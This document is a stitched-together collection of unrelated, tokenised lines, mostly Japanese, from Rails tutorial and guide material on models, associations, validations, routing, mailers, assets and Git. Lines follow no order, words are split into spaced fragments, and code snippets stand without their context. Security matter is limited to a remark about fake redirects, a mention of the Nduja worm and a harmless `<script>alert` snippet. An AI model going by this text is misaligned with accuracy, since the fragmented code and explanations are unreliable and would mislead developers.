▁# ▁=> ▁" sample %5 B %5 D = 3 ▖ 4 & sample %5 B %5 D = - 45 ▖ 6 "
▁ 次 の例では 、 見 かけ の動作 は まったく 同じです が 、 通常 では あり え ない 場所に コードが 置かれ ています 。
▁`: dependent ▁=> ▁: re strict ` オプションは ` belongs _ to ` から 削除 されました 。
▁#### # ▁` collection _ singular _ id s `
▁リスト \ ref { code : mail _ account _ activation } では 、\ k ode { mail } に \ k ode { subject } キー も 引数として 渡 しています ▟ この 値は メールの 件 名 になります 。
▁| ▁--------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁------------ -------- ▁|
▁" { 幅 } x { 高 さ } " という 形式で 特殊な size タグ を指定することもできます 。
▁ 画像 フォーマット のバリデーション
▁ 追 伸 : ▁\ k ode { rails ▁g } は ▁\ k ode { rails ▁generate } コマンド の 短縮 形 であり 、 Rails で サポート されている 多数の 短縮 形 のひとつ です ▁( 表 \ ref { table : shortcuts }) 。
▁* ▁ 修正 は 本当に 有効 か 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ first _ name ▁= ▁' Andy ') ▁LIMIT ▁1
▁ ユーザーに 返す レスポンス 画面 を 完全な ビュー にする のであれば 、 Rails はその ビューを さらに 別の レイアウト で ラ ッ ピ ング し 、 パーシャル ビュー として 取り出す でしょう 。
▁この エラー は ほとんどの場合 、 開発者 が ` render ` メソッドの 基本的な 動作を 誤 って 理解 している こと が原因で す 。
▁この 構成 は 、 JavaScript など 他の 言語 の ハッシュ 記 法 により 近 い もの になっ ており 、 Rails コ ミ ュ ニ テ ィ でも 人 気 が 高 ま っています 。
▁$ ▁rake ▁db : rollback
▁最後に 、 ▁` index ` アクション の テンプレート ( ` app / views / articles / index ▖ html ▖ erb ` ) に ' Destroy ' リンク を追加し 、 機能 を完成させ ましょう 。
▁* ▁` config ▖ after _ initialize ` には ブロック を渡すことができます ▟ この ブロック は 、 Rails による アプリケーションの 初期化 が完了し た ▁ _ 直後 _ ▁ に 実行されます 。
▁#< Client ▁id : ▁1, ▁first _ name : ▁" L u c as " ▁> ,
▁以下の 設定 オプションは 、 environment ▖ rb や production ▖ rb などの 環境 設定ファイル のいずれか で使用する のが 最適です 。
▁もちろん 、 ユーザー表示ページ の 最終的な 状態 は これ とは 大きく 異なります し 、 この メールアドレスが この まま 一般に 公開 される ような ことも ありません 。
▁ 今後 は 他の Active ▁Record コールバック と同様 の エラー 処理 を行います 。
▁* ▁` new ▖ html ▖ erb `
▁#### ▁ 要素 の 変更
▁しかし 、 Rails では 動作 が異なります ▟\ k ode { StaticPages Controller } は Ruby ▁ の クラス ですが 、\ k ode { Application Controller } クラス を継承し ている ため 、 StaticPages Controller の メソッドは ▁( たとえ 何も 書かれてい なくても ) ▁Rails 特有の 振る舞い を します ▟ 具体的には 、 / static \_ pages / home という URL にアクセスすると 、 Rails は StaticPages コントローラ を参照 し 、\ k ode { home } アクション に記述 されている コード を実行します ▟ その後 、 その アクション に対応する \ emph { ビュー } ▁(\ ref { sec : mvc } で説明した MVC の V に相当 ) ▁ を出力します 。
▁詳細については 、 Rails ガイド の 「\ href { http :// guides ▖ rubyonrails ▖ org / migrations ▖ html } { Active ▁Record ▁ マイグレーション }」 を参照してください 。
▁10 種類の 人 々
▁ リポジトリを Bitbucket に わざわざ プッシュ するのに は 2 つの 理由 があります ▟ 1 つ目は 、 ソースコード ▁( と その すべての 変更 履 歴 ) ▁ の 完全な バ ッ ク アップ を作成する ことです ▟ 2 つ目は 、 他の 開発者 と の 共 同 作業を より 簡単に 行う ことです 。
▁ ウェブ ブラウザ の種類 は 豊 富 ですが 、 大 半 の ▁Rails ▁ 開発者 は ▁ Firefox ▁ や ▁ Safari 、 あるいは ▁C h r o me ▁ を使います 。
▁たとえば 、` app / assets / stylesheets / projects ▖ css ▖ scss ▖ erb ` という スタイルシート では 、 最初に ERB として 処理 され 、 続いて SCSS 、 最後に CSS として 処理 されます ▟ 同様に して 、 ▁` app / assets / javascripts / projects ▖ js ▖ coffee ▖ erb ` ▁という JavaScript ファイル の場合 では 、 ERB ▁ → ▁CoffeeScript ▁ → ▁JavaScript ▁ の 順に 処理 されます 。
▁ これはリスト \ ref { code : account _ activation _ edit _ action } で使用されていました 。
▁3 つの ディレクトリ とは 、` app / assets ` の下に ある ` images `、` javascripts `、` stylesheets ` ディレクトリ です ▟ ただし これらの サブディレクトリ は 特殊な もの ではなく 、 実際には ` assets /* ` 以下の すべての パス が 検索 対象 になります 。
▁ 関連付け の種類
▁class ▁ Cookie sController ▁< ▁Application Controller
▁ 以前の Rails では 完全な JavaScript コード を挿入 していました が 、 Rails ▁3 から は 、 このように HTML プロパティ を使用して 簡単に JavaScript を使用できます ▟ これは 、\ href { http :// r ailscasts ▖ com / episodes / 20 5 - u nobtrusive - javascript }{\ emph { JavaScript を 前 面 に 出 す べ から ず } } という 哲 学 に従って います 。
▁上のコードは 以前 より 良 く なり ましたが 、 まだ タイトル のテスト が 少し 長 す ぎ ます 。
▁ 極めて シンプルな doc type 宣言 である \ k ode { < ! D O C TYPE ▁ html > } は 、 最新の 標準 HTML ▁( HTML 5 ) ▁ である ことを示しています 。
▁上の オプションは 、 モデルの 属性 設定 時に マスアサインメント を 防止 するのに 便利です 。
▁たとえば 、 ある モデル が 他の モデルに 従 属 している ( ` belongs _ to ` ) と 宣言 すると 、2 つの モデルの それぞれの インスタンス 間 で 「 主キー ▁- ▁ 外部キー 」 情報 を保持し ておく ように Rails に 指示 が 伝 わ ります 。
▁ いつものように データベース を 初期化 して 、 サンプルデータを 再度 生成 し 直 し 、 リスト \ ref { code : seed _ users _ activated } の 変更を 反 映 します 。
▁Client ▖ find _ or _ create _ by ( first _ name : ▁' Andy ')
▁* ▁`: destroy ` を指定すると 、 関連付けられたオブジェクト も すべて 同時に destroy されます 。
▁今度は テストが 成功 する ことを確認してください 。
▁create ▁config ▖ ru
▁ これはリスト \ ref { code : failing _ validates _ name _ spec } で使用されていました 。
▁最初の タイムスタンプ ▁( ` [ timestamp _ 1 ]` ) ▁ が 現在 時刻 、 次の タイムスタンプ ▁( ` [ timestamp _ 2 ]` ) ▁ が 現在 時刻 に 1 秒 追加 した 値 になります 。
▁ 生成された Rails アプリケーションは ブラウザの アドレス バー に URL を 入力 すれば 動 か す ことができる ので 、 これにより Rails アプリ の 構造 、 そして Rails で 推 奨 されている \ emph { REST アーキテクチャ } に関する 洞 察 を得る ことにします 。
▁[" 6 ", ▁"7" , ▁nil ]
▁#### ▁` demodulize `
▁* ▁` config ▖ action _ view ▖ prefix _ partial _ path _ with _ controller _ namespace ` は 、 名前空間化され た コントローラ から 出力 された テンプレート にある サブディレクトリ から 、 パーシャル ( 部分 テンプレート ) を 探 索 する かどうかを指定します 。
▁ リモート ブランチ 名 が ` my _ pull _ request ` の場合は 、 以下を実行し ます 。
▁subject ▁i 18 n ▖ t ▁: subject
▁ サイト を 正しく 防 衛 するには 、\ k ode { destroy } アクションに も アクセス制御 を行う 必要があります ▟ そこで 、 管理者 は ユーザーを削除 \ emph { できる } が 一 般 ユーザーは \ emph { できない } ことを テストで 確認し ましょう 。
▁ アセットパイプライン を使用する場合 、 最終的に アセット へのパス を 変換 する必要があります ▟ この ために 、` sass - rails ` ▁gem は 名前 が ` - url ` や ` - path ` で 終 わ る ▁( Sass 内で は ハイフン ですが 、 Ruby では アンダースコア で 表 します ) ▁ 各 種 ヘルパー を提供 しています ▟ ヘルパー が サポート する アセット クラスは 、 画像 、 フォント 、 ビデオ 、 音 声 、 JavaScript 、 stylesheet です 。
▁ 本書 では 今後 、 この サンプルアプリケーション を使って い く こと になるので 、\ href { https :// github ▖ com / new } { GitHub } 上に リポジトリ を作成し 、 プッシュ しておく と 良い でしょう 。
▁ 具体的には 、 レシーバの ハッシュ キー に対して ` to _ s ` を送信し ています 。
▁< optgroup ▁ label =" A f r ic a ">
▁ ページ 上 部 に 60 ピ ク セ ル の 余 白 を追加します 。
▁{0} 図 5 ▖ 1 {/0} {1} サンプルアプリケーションの Home ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / home _ page _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ デフォルトの オプション が ハッシュ で 与 えられ ると 、` with _ options ` は ブロック に対する プロキシ オブジェクト を生成します 。
▁ _ ▁ 攻撃者は 偽 の リダイレクト で どんな ことができ てしまう のでしょうか 。
▁#### ▁` tableize `
▁ 本番環境で クラウド スト レ ー ジ に保存 するためには 、 リスト \ ref { code : image _ uploader _ production } のように \ k ode { fo g } ▁gem を使うと 簡単です 。
▁つまり 、 以前の コミット を \ k ode { checkout } コマンド ▁( と 、 現在 まで の 変更を 強制的に 上書き して 元に戻す ための \ k ode { - f } フラグ ) ▁ で チェック ア ウ ト すれば 、 簡単に 削除 前 の状態 に 戻 す ことができます 。
▁これは 、` ActiveSupport :: Callbacks ` が Rails ▁4▖1 リリース に あ た って 大 幅 に 書き 換 えられ た こと による ものです 。
▁#### ▁` stringify _ keys ` と ` stringify _ keys !
▁つまり 、 この CSS ▁id を持つ 要素 が 変 化 した とき 、 この jQuery の 関数 が 動 き 出 します ▟ そして 、 もし ファイル サイズ が 大 き す ぎ た場合 、\ k ode { alert } メソッドで 警 告 を 出 す といった 仕 組み です
▁ 111▖2345 ▖ to _ s (: rounded ) ▁# ▁=> ▁111▖23 5
▁たとえば 、\ k ode { foo } という名前の 関数 定義 を見つけ る には 、「 de f ▁ foo 」 を グローバル 検索 します 。
▁User は 複数の Microposts を 持 って いて ▁(\ k ode { has \_ many }) 、 Micropost は 1 人 の User に依存し ている ▁(\ k ode { belongs \_ to }) ▁ といった 関係 性 を モデル 化 した
▁* ▁上 記 以外の 場合 、 引数 を 内 側 に 含 んだ 配列 ▁( 要素 が 1 つだけ の配列 ) ▁ が返されます 。
▁ そのために は 、 Rails のデフォルト を上書き する必要があります ▟ ここでは \ k ode { : source } パラメータ ー ▁( リスト \ ref { code : has _ many _ following _ through _ active _ relationships }) ▁ を使用し 、 「\ k ode { following } 配列 の 元 は \ k ode { followed } ▁id の 集合 である 」 ということ を明示的に Rails に 伝 えます 。
▁このガイドでは 、 Rails と Rack の関係 、 Rails と 他の Rack コンポーネント と の関係 について説明します 。
▁-- ▁create _ table (: comments )
▁( 2▖0▖ 0 以外の バージョンの Ruby を使用する場合 は 、 Ruby のバージョン を書き換え てください ) 。
▁ 結合 モデル で 検証 ( validation ) 、 コールバック 、 追加 の 属性 が 必要な のであれば 、` has _ many ▁: through ` を使用 しましょう 。
▁ 委譲 時に ` NoMethodError ` が発生し て 対象 が ` nil ` の場合 、 例外が発生します 。
▁ フィクスチャ のユーザー を有効に しておく
▁ 基本的な モデル を作成し たので 、 次に 要求 される 制限 を 実現 するための バリデーション を追加しましょう 。
▁` change ` メソッドは 、 与えられた 年 、 月 、 日 に応じて レシーバの 日付 を変更 し 、 与 えられ なかった 部分 は そのまま に して その 日付 を返します 。
▁validates ▁: email _ confirmation , ▁presence : ▁true
▁ 列 挙 可能 ▁( enumerable ) ▁ オブジェクト であること の 主な 条件 は 、\ k ode { each } メソッドを 実装 している ことです ▟ このメソッドは コレクション を列挙し ます 。
▁ エラーを 修正 して テストが ▁\ passing ▁ になるように するには 、 記憶ダイジェスト が \ k ode { nil } の 場合に \ k ode { false } を返す ように すればよいのです ▁( リスト \ ref { code : authenticated _ p _ fixed }) 。
▁foreign _ key : ▁" p at r on _ id "
▁ こう しておく と 、 リスト \ ref { code : layout _ links _ test _ signup _ full _ title _ helper } のような コード を使って 正しい タイトル をテストする ことができます ▁( ちなみに これは 前 回 の演習 の 応用 で もあります ) 。
▁has _ many ▁: p ar a gr a ph s
▁ ひとつ 面 白 い 話 があります ▟ これは 実は 元 々 Ruby ▁on ▁Rails 独自の 記 法 でした ▟ しかし 多くの 人 が この 記 法 を 好 む ようになった ので 、 今 では Ruby の コア 機能 として 導 入 されています 。
▁* ▁ Michael ▁Hartl ▁wrote ▁this ▁code ▖
▁次の 3 つの 章 に 渡 って 、 表 \ ref { table : RESTful _ users } の 他の 項目 も 利用 して 、 Users リソース を 完全に RESTful な リソース に するために必要な アクション をすべて 作成する 予定です 。
▁* ▁` lo o p : ▁true ` は 、 ビデオ を 最 後 まで 再 生 し 終わったら ループ します 。
▁この 行 では 、\ k ode { app / views / layouts / _ shim ▖ html ▖ erb } という ファイル を探し て そ の内容を 評価 し 、 結果を ビュー に 挿 入 しています
▁FROM ▁orders
▁query ▖ distinct ( false )
▁ これはリスト \ ref { code : persistent _ sessions _ test } で使用されていました 。
▁ 注 : サインイン と サインアウト の アクション のルーティング は カスタム で 設定 します が 、 セッション の 生成 アクション への ルーティング は デフォルト を使います ▁( i ▖ e ▖ , ▁\ k ode { [ resource ▁name ] _ path }) ▖
▁この節では メイラー と ビュー を定義し て 、 有効化トークン と メールアドレス ▁( = 有効 にする アカウント の アドレス ) ▁ を含む リンクを その中で 使用します 。
▁< p >
▁You ▁m ight ▁have ▁expected ▁an ▁instance ▁of ▁ Array ▖
▁m o un t ▁Blorgh :: Engine ▁=> ▁"/ blorgh "
▁ 上で 実行される SQL は 以下のような もの になります 。
▁class ▁Create Picture s ▁< ▁ActiveRecord :: Migration
▁<%= ▁@ article ▖ text ▁%>
▁ 現在の プロフィール ページ
▁ これはリスト \ ref { code : test _ helper _ log _ in } で使用されていました 。
▁この データモデル と Web インターフェイス は 、 組み 合 わ さ って \ emph { Users リソース } となり 、 ユーザー という もの を 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol } { HTTP プロトコル } 経由で 自由に 作成 / 読み出し / 更新 / 削除 できる オブジェクト とみなす ことが できるようになります 。
▁この ダ ミ ー アプリケーションは エンジンの マウント 場所 として 使用される ので 、 エンジンの テストが きわめて シ ン プ ル になります 。
▁ こういった ときに 便利な \ k ode { allow \_ nil : ▁true } という オプション が あるので 、 これを ▁\ k ode { validates } に追加します ▁( リスト \ ref { code : allow _ blank _ password }) 。
▁Active ▁Record の モデル を作成する
▁orders ▖ clear
▁#### ▁HTML を出力する
▁以上で コントローラと ビュー が作成され ました ▟ Rails に " Hello , ▁Rails !" と 表示 させ てみましょう 。
▁ あのときは Users コントローラ 内に このメソッド が あった ので 、 before フィルター で 指定 していました が 、 ▁このメソッドは Microposts コントローラ でも 必要です ▟ そこで 、 各 コントローラ が 継 承 する Application コントローラに ▁(\ ref { sec : a _ controller _ class }) 、 この メソッドを 移 し てしまい ましょう 。
▁# ▁Rails ▁4▖0 の場合
▁def ▁session _ store = ( store )
▁[1, ▁2, ▁3] ▖ sum ▁# ▁=> ▁6
▁$ ▁rake ▁db : migrate
▁ テンプレート の 最 下 部 に 以下 を追加します 。
▁第 \ ref { cha : sign _ up } 章で サイトに ユーザー を追加する ときに 備えて 、 最初の \ k ode { link \_ to } に 仮 のリンク を作成します 。
▁address : ▁' smtp ▖ g mail ▖ com ',
▁* ▁Rails ▁4▖0 では 、` secret _ key _ base ` が設定され ている と cookie ベースの セッション の内容 が 暗号化 されます 。
▁#### ▁ モジュール 属性
▁#### ▁ ActiveSupport :: Concern を使用して decorator パターン を実装する
▁ 個 別の メイラー ビュー は 、 その 名前 が メイラー メソッド と同じ になるので 、 クラス から 認 識 できます 。
▁(\ emph { ヒント } : ▁最初に 、\ k ode { user _ params } の 許可 リスト に \ k ode { admin } を \ emph { 追加 } する必要があります ) 。
▁第 \ ref { cha : log _ in _ log _ out } 章では 、 認 証 ▁( authentication ) ▁ システム を導入し 、 ユーザーがログイン と ログアウト を できるようにします 。
▁* ▁Rails ▁4▖0 では ` assert _ generate s `、` assert _ recognizes `、` assert _ routing ` の動作 が変更され ました 。
▁ データベースの 用 語 で説明する と 、 この 関連付け が 行われている クラス には 外部キー がある ということです 。
▁リスト \ ref { code : users _ resource } のコード を使用することで 、 ルーティング が 有効 になります ▟ ただし 、 ルーティング 先 の ページ はまだ ありません ▁( 図 \ ref { fig : user _ show _ unknown _ action _ 4 }) 。
▁* ▁`: user _ name ` ▁- ▁ メール サーバー で 認 証 が 要求 される 場合は 、 ここで ユーザー名 を設定します 。
▁ Content - Type : ▁text / html ; ▁ cha r set = utf -8
▁ 各 ユーザー には 、 重複 の ない 一意 の キー となる \ k ode { integer } 型の ID 番号 ▁(\ k ode { id } と呼びます ) ▁ を 割り当て 、 この ID に 加えて 一 般 公開 される \ k ode { string } 型の 名前 ▁(\ k ode { name }) 、 そして 同じ く \ k ode { string } 型の メールアドレス ▁(\ k ode { email }) ▁ を 持 た せ ます ▟ メールアドレス は ユーザー名 としても 使われ ます 。
▁ ユーザー登録ページ で 重要な 点 は 、 ユーザー登録 に 欠 か せ ない 情報を 入力 するための \ emph { form } です 。
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } で使用されていました 。
▁Rails は v a nil la ▁JavaScript を出力する こともできます 。
▁### ▁` validates _ each `
▁ マイグレーション は 、 データベースの 構造 を イン ク リ メ ン タ ル に 変更 する手段 を提供します ▟ それ により 、 要求 が変更され た場合 に データモデル を 適 合 させる ことができます 。
▁上の コマンド を実行すると 以下の 情報 が出力されます 。
▁" rubi es "▖ singularize ▁# ▁=> ▁" ruby "
▁ 新しい セッション の フォーム が正しく 表示 された ことを確認する
▁` store _ accessor s ` メソッドは ` json ` カラム や ` h store ` カラム に依存し ているので 、 同様に シンボル での アクセス が 行 え なくなります 。
▁=> ▁" 1 ▁error "
▁作成した テストを リスト \ ref { code : password _ reset _ integration _ test } に示します ▟ このテストは コード リ ー デ ィ ング の よい 練 習 台 になります ので 、 み っ ち り お 読み ください 。
▁Sprockets は アセット にアクセス するための メソッドを 特に 追加 しません ▟ 従来 同様 ` javascript _ include _ tag ` と ` stylesheet _ link _ tag ` を使用します 。
▁それでは 実際 どのように 動作する のか 見 てみましょう
▁このメソッドは 以下のような 定 番 の 用 法 において 便利です 。
▁ { p 0} では 文字列 に対して {2} empty ? {/2} メソッド を使用しました が 、 Rails の エラー オブジェクトに対して も使用できます ▟ オブジェクトが 空の 場合は {2} true {/2} 、 ▁ それ以外の 場合は {2} false {/2} を返します 。
▁def ▁ initialize
▁ 一部の Web ブラウザ や プロキシ サーバー は この種の リダイレクト を キャッシュ すること があり 、 その 場合 リダイレクト 前の 古 い ページ には アクセス でき なくなります 。
▁{0} 図 7 ▖ 6 {/0} ▁{1} Users リソース 追加 後 の の ユーザー表示ページ {/1}
▁M i me :: Type ▖ register ▁' application / json - patch + json ', ▁: json _ patch
▁=> ▁" the ▁user "
▁render ▁action : ▁" edit "
▁Rails の慣習 に従って 、 関連付け された テスト データを fixture ファイル に追加する と 、 次のようになります 。
▁ サブディレクトリ 内の アセット にも アクセス できます 。
▁A ▖ x ▁# ▁=> ▁: a
▁Gravatar は \ href { http :// github ▖ com /}{ GitHub } の 共 同 設 立 者 である To m ▁P re st on - W er n er によって 開発 され 、 後に \ href { http :// auto m at tic ▖ com /}{ A u to m at tic } ▁(\ href { http :// word press ▖ com /}{ Word P re s s } の 作 者 ) ▁ に 買 い 取 ら れ ました ▟ Gravatar は 無料 の サービス で 、 プロファイル 写 真 を アップロード して 、 指定した メールアドレス と 関連付け ることができます 。
▁web mail ワーム の 他の 概念 実 証 的な 事例 として N d u ja を 取り上げ ます 。
▁ (▖▖▖)
▁#### ▁ まとめ
▁最初に 、 Gemfile の ` development ` グループ に ` gem ▁' web - console ', ▁' ~ > ▁2▖0 ' ` を追加し 、` bundle ▁install ` を実行し てください ▁( この gem は Rails を 過 去 のバージョン から アップグレード した 場合には 含 まれ ないので 、 手動で 追加 する必要があります ) 。
▁$ ▁rails ▁generate ▁model ▁User ▁name : string ▁email : string
▁textColor ▁= ▁$ ( this )▖ data (" text - color ")
▁#### ▁` belongs _ to ` の オプション
▁ アプリケーション 固有の CSS 用 マニフェストファイル
▁ 一般的 に 、 開発環境 と 本番環境 は 、 データベース も含め て なるべく 同じ に しておく 方が 便利です ▟ しかし 本チュートリアル では 、 教 育 的 見 地 から あえて ローカル では SQLite 、 本番 では PostgreSQL を使用する ようにしています 。
▁### ▁` class _ eval (* args , ▁& block ) `
▁デフォルトは 、` ActionView :: Helpers :: Form Builder ` です 。
▁### ▁ ルーティング の 「 con c er n 」 機能
▁ ほぼ あらゆる オブジェクトを 文字列に変換 する \ k ode { to \_ s } メソッドを使用して 、 nil が メソッド に応答する 例を お 目 に かけ ましょう 。
▁` split ` メソッドは 、 指定 の セ パ レ ー タ で 配列 を 分割 し 、 分割 された チ ャ ン ク を返します 。
▁# ▁< id > 4 3 5 6 </ id >
▁ 関連付けを 一括読み込み する
▁ ファイル を追加する ▁(\ k ode { ▖ gitignore } で指定されている もの を 除 く ) ▁ には 、 以下のコマンドを実行し ます 。
▁ ub section ▁basic _ image _ upload ▁( end )╼╼ ╼\ subsection { 画像 の検証 } ▁% ▁( fold )╼\ label { sec : image _ validation }╼╼
▁ 単語 \ emph { は } 文字列 なので 、\ k ode { {2} リスト 4 ▖ 12 {/2} } のように {3} Word {/3} クラスは ▁ {3} String {/3} クラスを \ emph { 継 承 } する のが 自 然 です
▁< script > alert (' Hello ') ; </ script >
▁` id s ` は 、 テーブルの 主キー を使用する リレーション の ID をすべて 取り出す の に 使用できます 。
▁ ステージング エリア で 控 え ている 変更を 本 格 的に リポジトリ に 反 映 ▁( コミット ) ▁ するには 、\ k ode { commit } コマンド を使います 。
▁f ") ▁# ▁=> ▁true
▁ ここに は Rails が \ href { http :// en ▖ w ikipedia ▖ org / wiki / Model - view - controller } { MVC ▁( model - view - controller )} ▁という アーキテクチャ パターン を採用し ていること が 暗 に 示 されています ▟ MVC では 、 ドメイン ロ ジ ッ ク ▁( ビ ジ ネ ス ロ ジ ッ ク とも い います ) ▁ と 、 グ ラ フ ィ カ ル ユーザー インターフェイス ▁( GUI ) ▁ と 密 に関連する 入力 / 表示 ロ ジ ッ ク を 分 離 します 。
▁\ k ode { first _ app } ディレクトリ 直 下 にある デフォルトの \ k ode { Gemfile } 。
▁もちろん 、 今度は メールアドレス の 存在性 も 検証 しましょう 。
▁ 上で 実行される SQL は 以下のような もの になります 。
▁$ ▁bin / rails ▁generate ▁scaffold ▁article ▁title : string ▁text : text
▁ Q U E RY ▁P LA N
▁` development ▖ rb ` で はデフォルトで ` true ` に設定されます 。
▁#### ▁ ファイルを インライン で 添付 する
▁# ▁ 永 続 セッション のために ユーザーを データベースに 記 憶 する
▁` C ON T R O L L ER ` 環境変数 を設定する ことで 、 ルーティング 一覧 の表示 を 特定の コントローラに マ ッ プ された もの に 制限 することもできます 。
▁* ▁` config ▖ active _ record ▖ schema _ format ` は 、 データベース スキーマ を ファイルに 書き 出 す 際の フォーマット を指定します 。
▁{0}{1} 第 11 章 {/1}{/0} と {2}{1} 第 12 章 {/1}{/2} では 、 関連付けられた ユーザー と マイクロポストを 同時に 表示 し 、 Twitter のような マイクロポストの フィード を作成する 予定です 。
▁G oodnessValidator ▖ new ( person )▖ validate
▁ 「 forgot ▁password 」 フォーム のモックアップ
▁### ▁ Cookie s シ リ ア ラ イ ザ
▁ 既に 読者 の 皆 様 は 、 {0} cost {/0} 変数 の定義 に 三項演算子 を使用した リスト { p 1 } のコード も 理解 できる ようになった ことでしょう 。
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email _ test } で使用されていました 。
▁validates ▁: b io , ▁length : ▁ { ▁ maximum : ▁100 0,
▁ ステップ を追加した ら 、 以下を実行し ます 。
▁> > ▁x ▁= ▁1
▁Ruby では 、 この 2 つの ク オ ー テ ー ション を 併 用 すること が 一般的 です ▟ 詳 しく は \ ref { sec : string s } で 解説します 。
▁Active ▁Support では ` Date ▖ yesterday ` メソッドと ` Date ▖ tomorrow ` も 定義 しています ▟ インスタンス では ` past ?` 、` today ?` 、` future ?` を使用 でき 、 これらは すべて ` Date ▖ current ` を 起 点 として 導 か れ ます 。
▁この章では 、\ emph { 順序 } と \ emph { 依存関係 } を マイクロポスト に追加し 、\ k ode { user ▖ microposts } メソッドが 実際に マイクロポストの 配列 を返す こと をテストします 。
▁ 変更 後 :
▁* ▁ インデント は スペース 2 つ を使用する ▟ タブ 文字 は 使用 し ないこと 。
▁たとえば 次のようになります 。
▁` in _ groups ` は 、 配列 を 指定 の 個 数 の グループ に 分割 します 。
▁作成した コードをリスト \ ref { code : user _ profile _ test } に示します
▁たとえば 、 以下のような ルーティング が 1 つ あるとします 。
▁ メイラー で使用する レイアウト 名 は メイラー と同じ 名前 である 必要があります ▟ たとえば 、` user _ mailer ▖ html ▖ erb ` や ` user _ mailer ▖ text ▖ erb ` という レイアウト は自動的に メイラー で レイアウト として 認 識 されます 。
▁HTTP ▁only ▁cookie は IE ▁ v 6 から 使用できます 。
▁\ emph { Rails チュートリアル } ▁ では 、 一 字 一 句 間 違 え ること なく 最初から 正確に 実装 する の ではなく 、 アプリケーションの 振る舞い を テスト しながら 実装 する 直 観 的な 手法 を採用し ています ▟ この 開発 手法 は 、 テスト駆動開発 ▁( Test - D r ive n ▁De ve l p ment , ▁ TDD ) ▁ から 派 生 した 振 舞 駆 動 開発 ▁( B e ha v i or - D r ive n ▁Development , ▁B D D ) ▁ として 知 ら れ ています 。
▁ /* ▁ footer ▁* /
▁リスト \ ref { code : follow _ form _ partial } では 、 これは フォーム を 囲 む \ k ode { div } タグ であり 、 フォーム そのもの では なかった ことを思い出してください 。
▁ 今回 の目的は 、 ユーザー 毎 に すべての マイクロポストを 描画 できるように することです 。
▁* ▁` create _ association ( attributes ▁= ▁{}) `
▁{0} 図 3 ▖3{/0}{1} 赤 く 表示 されている ▁( 失敗した ) ▁ テスト ▟\ href { http :// railstutorial ▖ org / images / figures / r ed _ failing _ spec _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁class ▁Create Article s ▁< ▁ActiveRecord :: Migration
▁これらの カラム は 、 Active ▁Record が モデル 間 の関連付け を作成するとき に 参 照 されます 。
▁ 開発環境 は 、 Rails プログラマ 一 人 ひ と り すべて 異なります ▟ 開発者 は 慣 れ て く る に従い 、 自分の 環境 を 徹 底 的に カスタマイズ する もの だ からです ▟ 開発環境 を 大 別 すると 、 テキストエディタ や コマンドライン を使う 環境 と 、 IDE ▁( 統合 開発環境 ) ▁ の 2 つ に分け られます 。
▁また 、\ emph { ア ン カ ー } タグ ▁\ k ode { a } ▁ を使って 、 指定した URL に ジ ャ ン プ する 以下の リンク を追加し ました ▁( ちなみに ア ン カ ー タグ 内の ▁“ href ” ▁ は ▁“ h y p er text ▁reference ” ▁ と 読み ます ) 。
▁Rails チーム は 、 パブリックな API に対して 重大な 変更 を行なう 際 は 、 必ず 非推奨 サイクル を 経 て から 行なう ことに しています 。
▁class ▁ Template ▁< ▁ :: Tilt :: Template
▁ Ctrl - D を 押 す と プロンプト から 抜 け 出 す ことができます ▟ また 、 デバッグ が 終わったら \ k ode { show } アクション 内の \ k ode { debugger } の 行 を削除し てしまい ましょう ▁( リスト \ ref { code : debugger _ remove d }) 。
▁ 例外 と 例外 ハ ンド リ ング は 、 ある 意味 で Ruby の 高度な テーマ です ▟ 本書 では 例外 について これ 以上 言 及 しません 。
▁` E n um er able ` の拡張
▁X - Cache : ▁H IT
▁ デザイン された ロゴ と サンプル アプリ
▁次に 、\ k ode { data - turbolinks - track } における キー と 値 の ペ ア の 表 記 が 、 旧 式 の ハッシュ ロ ケ ッ ト ▁( => ) ▁ スタイル になっている 点が 不思議 です 。
▁ 各 ネスティング レベルで は 、 自身 の 呼び出し に 、 継 承 した デフォルト 呼び出し を マージ します 。
▁ 現在の Active ▁Record では 、` after _ rollback ` や ` after _ commit ` コールバック での 例外 を 抑 制 し ており 、 例外 時に は ログ出力 のみ が 行われます 。
▁\ k ode { help } アクション に対応する ビュー も 、 上のコード と似ています ▁( リスト \ ref { code : raw _ help _ view }) 。
▁User モデルに 完全な フィード を追加する 。
▁\ ref { sec : demo _ users _ resource } で 簡単に 説明したとおり 、 この カラム は自動的に 作成 され 、 Rails が 各 行 を 一意 に 識 別 するために 使用します 。
▁ こういった ケース は アプリケーション を使っている と 普通 に 起こ ること なので 、 ログイン ページに 転 送 して 、 その ときに 分 か り やすい メッセージ も 表示する ようにしましょう ▟ モックアップ を 図 \ ref { fig : login _ page _ protected _ mockup } に示します 。
▁ここまで でき れば 、 {0} current _ user {/0} メソッドに 仕 込 んだ {0} raise {/0} を削除し て 元に戻す ▁( リスト { p 1 }) ▁ ことで 、 リスト \ ref { code : branch _ no _ raise } のテスト が パスするはずです
▁### ▁ 部分 テンプレート ( パーシャル ) を使用して ビューの 重複 コードを き れ い にする
▁\ k ode { email } 属性 の 存在性 を検証する
▁しかし 、 今回の ように ▁“ 1 ▁microposts ” ▁ と 表示 してしまう と 英語 の 文法 上 誤り になってしまいます ▟ そこで 、 { p 0} で紹介した {2} pluralize {/2} メソッドを使って ▁“ 1 ▁micropost ” ▁ や ▁“ 2 ▁microposts ” ▁ と 表示する ように 調 整 しています 。
▁ 新しい メソッドは ` qualified _ const _ defined ?` 、` qualified _ const _ get `、` qualified _ const _ set ` です 。
▁Active ▁Record オブジェクトの コレクション を 渡す こともできます 。
▁ 関連付け が存在する ことを確認 したい場合は 、 関連付けられたオブジェクト 自体 が存在する ことを確認 し 、 そのオブジェクト が 関連付け に マッピング された 外部キー でない ことを確認する 必要があります 。
▁create ▁mode ▁100 64 4 ▁README ▖ md
▁belongs _ to ▁: supplier , ▁ inverse _ of : ▁: account
▁# ▁従って ここで p ry を呼び出し ても 問題 ない
▁ トークン 生成 用 メソッド を追加する
